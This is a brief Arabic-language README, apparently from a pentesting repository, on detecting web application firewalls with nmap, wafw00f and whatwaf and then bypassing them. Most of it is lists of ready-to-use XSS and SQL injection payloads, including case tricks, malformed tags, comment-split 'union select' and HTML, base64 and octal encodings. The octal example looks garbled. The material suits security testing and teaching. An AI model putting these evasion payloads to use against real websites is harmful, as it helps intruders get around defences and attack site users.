# Bypass-web
Overtaking, recognition

# تجاوز جدران حماية تطبيقات الويب (WAFs)

## يدوياً
لتشغيل جدار الحماية والتحقق من وجوده يدويًا، يمكن إجراء طلب HTTP باستخدام استعلام ضار في عنوان URL، مثل


`example.com/?test=<script>alert(1)</script>`                                                                                                                                                                                                                                                                                                                          

 في هذه الحالة، قد ترجع WAFs رمز خطأ HTTP 400s.

## التشغيل الآلي
يمكن استخدام أدوات مختلفة لاكتشاف WAFs تلقائيًا:
1. **NMAP**:
   ```bash
   nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com
   
2. WafW00f:
   bash
   wafw00f [example.com](https://example.com)
   
3. WhatWaf:
   bash
   whatwaf -u [example.com](https://example.com)
   


## تجاوز WAFs
### تجاوز Regex
بدلاً من استخدام الحمولات التقليدية مثل <script>alert(XSS)</script>، فكر في استخدام البدائل التالية:
- <sCrIpT>alert(XSS)</sCriPt>
- <<script>alert(XSS)</script>
- <script>alert(XSS) //
- <script>alert\`XSS\`</script>
- java%0ascript:alert(1)
- <iframe src=malicous.com <
- <STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYL E>
- <img/src=1/onerror=alert(0)>
- <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a>

### التشويش
يمكن أيضًا استخدام تقنيات التشويش لتجاوز WAFs:
- Function("ale"+"rt(1)")();
- javascript:74163166147401571561541571411447514115414516216450615176 (octal encoding)
- <iframe src="javascript:alert(\`xss\`)"> (unicode encoding)
- /?id=1+un/**/ion+sel/**/ect+1,2,3 (using comments in SQL query)
- %26%2397;lert(1) (HTML encoding)
- data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ (base64 encoding)

لمزيد من التقنيات والمعلومات، راجع [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

شكرا على القراءة! ᓚᘏᗢ
